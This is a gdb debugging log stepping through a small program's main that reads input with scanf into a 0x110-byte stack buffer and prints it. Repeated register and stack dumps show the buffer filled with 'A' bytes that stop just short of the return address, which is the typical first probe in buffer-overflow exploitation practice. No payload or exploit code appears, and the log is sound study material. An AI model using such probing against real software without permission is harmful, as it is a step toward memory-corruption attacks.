  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040070d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003DBE1708D28  RDX: 0x000003DBE1708D38  RCX: 0x0000000000000000  RIP: 0x0000000000400714
  R8 : 0x0000034E6B3E2E80  R9 : 0x0000034E6B3F8530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400714 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DBE1708B30  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003DBE1708D28  RDX: 0x000003DBE1708D38  RCX: 0x0000000000000000  RIP: 0x000000000040071B
  R8 : 0x0000034E6B3E2E80  R9 : 0x0000034E6B3F8530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071b in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DBE1708B30  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003DBE1708B30  RDX: 0x000003DBE1708D38  RCX: 0x0000000000000000  RIP: 0x000000000040071E
  R8 : 0x0000034E6B3E2E80  R9 : 0x0000034E6B3F8530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DBE1708B30  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x00000000004007EE  RSI: 0x000003DBE1708B30  RDX: 0x000003DBE1708D38  RCX: 0x0000000000000000  RIP: 0x0000000000400723
  R8 : 0x0000034E6B3E2E80  R9 : 0x0000034E6B3F8530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400723 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x00000000004007EE  RSI: 0x000003DBE1708B30  RDX: 0x000003DBE1708D38  RCX: 0x0000000000000000  RIP: 0x0000000000400728
  R8 : 0x0000034E6B3E2E80  R9 : 0x0000034E6B3F8530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400728 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000001  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x0000034E6B3E2640  RSI: 0x0000034E6B3E39F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x000000000040072D
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DBE1708C38  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040072d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DBE1708B30  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x0000034E6B3E2640  RSI: 0x0000034E6B3E39F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400734
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DBE1708C38  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400734 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DBE1708B30  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x000003DBE1708B30  RSI: 0x0000034E6B3E39F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400737
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DBE1708C38  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400737 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000108  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x000003DBE1708B30  RSI: 0x0000000000000000  RDX: 0x0000000000000038  RCX: 0xFF00000000000000  RIP: 0x000000000040073C
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DBE1708C38  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073c in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000108  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x000003DBE1708B30  RSI: 0x0000000000000000  RDX: 0x0000000000000038  RCX: 0xFF00000000000000  RIP: 0x000000000040073F
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DBE1708C38  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073f in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DBE1708B30  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x000003DBE1708B30  RSI: 0x0000000000000000  RDX: 0x0000000000000038  RCX: 0xFF00000000000000  RIP: 0x0000000000400746
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DBE1708C38  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400746 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DBE1708B30  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x000003DBE1708B30  RSI: 0x000003DBE1708B30  RDX: 0x0000000000000038  RCX: 0xFF00000000000000  RIP: 0x0000000000400749
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DBE1708C38  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400749 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DBE1708B30  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x00000000004007F1  RSI: 0x000003DBE1708B30  RDX: 0x0000000000000038  RCX: 0xFF00000000000000  RIP: 0x000000000040074E
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DBE1708C38  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040074e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x00000000004007F1  RSI: 0x000003DBE1708B30  RDX: 0x0000000000000038  RCX: 0xFF00000000000000  RIP: 0x0000000000400753
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DBE1708C38  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400753 in main ()
gdb$ 
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000000000000010F  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a P c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEF1  RDX: 0x0000034E6B3E39E0  RCX: 0x000000000000010E  RIP: 0x0000000000400758
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x0000034E6B3E06A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400758 in main ()
gdb$ i r
rax            0x10f	0x10f
rbx            0x0	0x0
rcx            0x10e	0x10e
rdx            0x34e6b3e39e0	0x34e6b3e39e0
rsi            0x7ffffef1	0x7ffffef1
rdi            0x1	0x1
rbp            0x3dbe1708c40	0x3dbe1708c40
rsp            0x3dbe1708b20	0x3dbe1708b20
r8             0x4141414141414141	0x4141414141414141
r9             0x4141414141414141	0x4141414141414141
r10            0x34e6b3e06a0	0x34e6b3e06a0
r11            0x246	0x246
r12            0x4005e0	0x4005e0
r13            0x3dbe1708d20	0x3dbe1708d20
r14            0x0	0x0
r15            0x0	0x0
rip            0x400758	0x400758 <main+92>
eflags         0x206	[ PF IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb$ x/22xg $rsp
0x3dbe1708b20:	0x000003dbe1708d28	0x0000000100000000
0x3dbe1708b30:	0x4141414141414141	0x4141414141414141
0x3dbe1708b40:	0x4141414141414141	0x4141414141414141
0x3dbe1708b50:	0x4141414141414141	0x4141414141414141
0x3dbe1708b60:	0x4141414141414141	0x4141414141414141
0x3dbe1708b70:	0x4141414141414141	0x4141414141414141
0x3dbe1708b80:	0x4141414141414141	0x4141414141414141
0x3dbe1708b90:	0x4141414141414141	0x4141414141414141
0x3dbe1708ba0:	0x4141414141414141	0x4141414141414141
0x3dbe1708bb0:	0x4141414141414141	0x4141414141414141
0x3dbe1708bc0:	0x4141414141414141	0x4141414141414141
gdb$ 
0x3dbe1708bd0:	0x4141414141414141	0x4141414141414141
0x3dbe1708be0:	0x4141414141414141	0x4141414141414141
0x3dbe1708bf0:	0x4141414141414141	0x4141414141414141
0x3dbe1708c00:	0x4141414141414141	0x4141414141414141
0x3dbe1708c10:	0x4141414141414141	0x4141414141414141
0x3dbe1708c20:	0x4141414141414141	0x4141414141414141
0x3dbe1708c30:	0x4141414141414141	0x0000010800000000
0x3dbe1708c40:	0x0000000000000000	0x0000034e6b044f45
0x3dbe1708c50:	0x000003dbe1708d28	0x000003dbe1708d28
0x3dbe1708c60:	0x0000000100000001	0x00000000004006fc
0x3dbe1708c70:	0x0000000000000000	0xefcd6ba4e691d31b
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a P c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEF1  RDX: 0x0000034E6B3E39E0  RCX: 0x000000000000010E  RIP: 0x000000000040075D
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x0000034E6B3E06A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
   0x40076a <__libc_csu_init+10>:	push   r13
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040075d in main ()
gdb$ i r
rax            0x0	0x0
rbx            0x0	0x0
rcx            0x10e	0x10e
rdx            0x34e6b3e39e0	0x34e6b3e39e0
rsi            0x7ffffef1	0x7ffffef1
rdi            0x1	0x1
rbp            0x3dbe1708c40	0x3dbe1708c40
rsp            0x3dbe1708b20	0x3dbe1708b20
r8             0x4141414141414141	0x4141414141414141
r9             0x4141414141414141	0x4141414141414141
r10            0x34e6b3e06a0	0x34e6b3e06a0
r11            0x246	0x246
r12            0x4005e0	0x4005e0
r13            0x3dbe1708d20	0x3dbe1708d20
r14            0x0	0x0
r15            0x0	0x0
rip            0x40075d	0x40075d <main+97>
eflags         0x206	[ PF IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb$ x/22xg $rsp
0x3dbe1708b20:	0x000003dbe1708d28	0x0000000100000000
0x3dbe1708b30:	0x4141414141414141	0x4141414141414141
0x3dbe1708b40:	0x4141414141414141	0x4141414141414141
0x3dbe1708b50:	0x4141414141414141	0x4141414141414141
0x3dbe1708b60:	0x4141414141414141	0x4141414141414141
0x3dbe1708b70:	0x4141414141414141	0x4141414141414141
0x3dbe1708b80:	0x4141414141414141	0x4141414141414141
0x3dbe1708b90:	0x4141414141414141	0x4141414141414141
0x3dbe1708ba0:	0x4141414141414141	0x4141414141414141
0x3dbe1708bb0:	0x4141414141414141	0x4141414141414141
0x3dbe1708bc0:	0x4141414141414141	0x4141414141414141
gdb$ 
0x3dbe1708bd0:	0x4141414141414141	0x4141414141414141
0x3dbe1708be0:	0x4141414141414141	0x4141414141414141
0x3dbe1708bf0:	0x4141414141414141	0x4141414141414141
0x3dbe1708c00:	0x4141414141414141	0x4141414141414141
0x3dbe1708c10:	0x4141414141414141	0x4141414141414141
0x3dbe1708c20:	0x4141414141414141	0x4141414141414141
0x3dbe1708c30:	0x4141414141414141	0x0000010800000000
0x3dbe1708c40:	0x0000000000000000	0x0000034e6b044f45
0x3dbe1708c50:	0x000003dbe1708d28	0x000003dbe1708d28
0x3dbe1708c60:	0x0000000100000001	0x00000000004006fc
0x3dbe1708c70:	0x0000000000000000	0xefcd6ba4e691d31b
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x0000000000000000  RSP: 0x000003DBE1708C48  o d I t s z a P c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEF1  RDX: 0x0000034E6B3E39E0  RCX: 0x000000000000010E  RIP: 0x000000000040075E
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x0000034E6B3E06A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
   0x40076a <__libc_csu_init+10>:	push   r13
   0x40076c <__libc_csu_init+12>:	mov    r13,rdx
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040075e in main ()
gdb$ i r
rax            0x0	0x0
rbx            0x0	0x0
rcx            0x10e	0x10e
rdx            0x34e6b3e39e0	0x34e6b3e39e0
rsi            0x7ffffef1	0x7ffffef1
rdi            0x1	0x1
rbp            0x0	0x0
rsp            0x3dbe1708c48	0x3dbe1708c48
r8             0x4141414141414141	0x4141414141414141
r9             0x4141414141414141	0x4141414141414141
r10            0x34e6b3e06a0	0x34e6b3e06a0
r11            0x246	0x246
r12            0x4005e0	0x4005e0
r13            0x3dbe1708d20	0x3dbe1708d20
r14            0x0	0x0
r15            0x0	0x0
rip            0x40075e	0x40075e <main+98>
eflags         0x206	[ PF IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb$ x/22xg $rsp
0x3dbe1708c48:	0x0000034e6b044f45	0x000003dbe1708d28
0x3dbe1708c58:	0x000003dbe1708d28	0x0000000100000001
0x3dbe1708c68:	0x00000000004006fc	0x0000000000000000
0x3dbe1708c78:	0xefcd6ba4e691d31b	0x00000000004005e0
0x3dbe1708c88:	0x000003dbe1708d20	0x0000000000000000
0x3dbe1708c98:	0x0000000000000000	0xe87aa945fe31d31b
0x3dbe1708ca8:	0xe951bdac7b6bd31b	0x0000000000000000
0x3dbe1708cb8:	0x0000000000000000	0x0000000000000000
0x3dbe1708cc8:	0x000003dbe1708d38	0x0000034e6b60c1c8
0x3dbe1708cd8:	0x0000034e6b3f81f3	0x0000000000000000
0x3dbe1708ce8:	0x0000000000000000	0x00000000004005e0
gdb$ 
0x3dbe1708cf8:	0x000003dbe1708d20	0x0000000000000000
0x3dbe1708d08:	0x0000000000400609	0x000003dbe1708d18
0x3dbe1708d18:	0x000000000000001c	0x0000000000000001
0x3dbe1708d28:	0x000003dbe1708f75	0x0000000000000000
0x3dbe1708d38:	0x000003dbe1708f96	0x000003dbe1708fa5
0x3dbe1708d48:	0x000003dbe1708fb6	0x000003dbe1708fc8
0x3dbe1708d58:	0x000003dbe1708fda	0x000003dbe1708fea
0x3dbe1708d68:	0x000003dbe1708ffe	0x000003dbe1709020
0x3dbe1708d78:	0x000003dbe1709031	0x000003dbe1709044
0x3dbe1708d88:	0x000003dbe170905a	0x000003dbe170906d
0x3dbe1708d98:	0x000003dbe1709078	0x000003dbe1709084
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x0000000000000000  RSP: 0x000003DBE1708C50  o d I t s z a P c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEF1  RDX: 0x0000034E6B3E39E0  RCX: 0x000000000000010E  RIP: 0x0000034E6B044F45
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x0000034E6B3E06A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x34e6b044f45 <__libc_start_main+245>:	mov    edi,eax
   0x34e6b044f47 <__libc_start_main+247>:	call   0x34e6b05f1e0 <__GI_exit>
   0x34e6b044f4c <__libc_start_main+252>:	xor    edx,edx
   0x34e6b044f4e <__libc_start_main+254>:	jmp    0x34e6b044e89 <__libc_start_main+57>
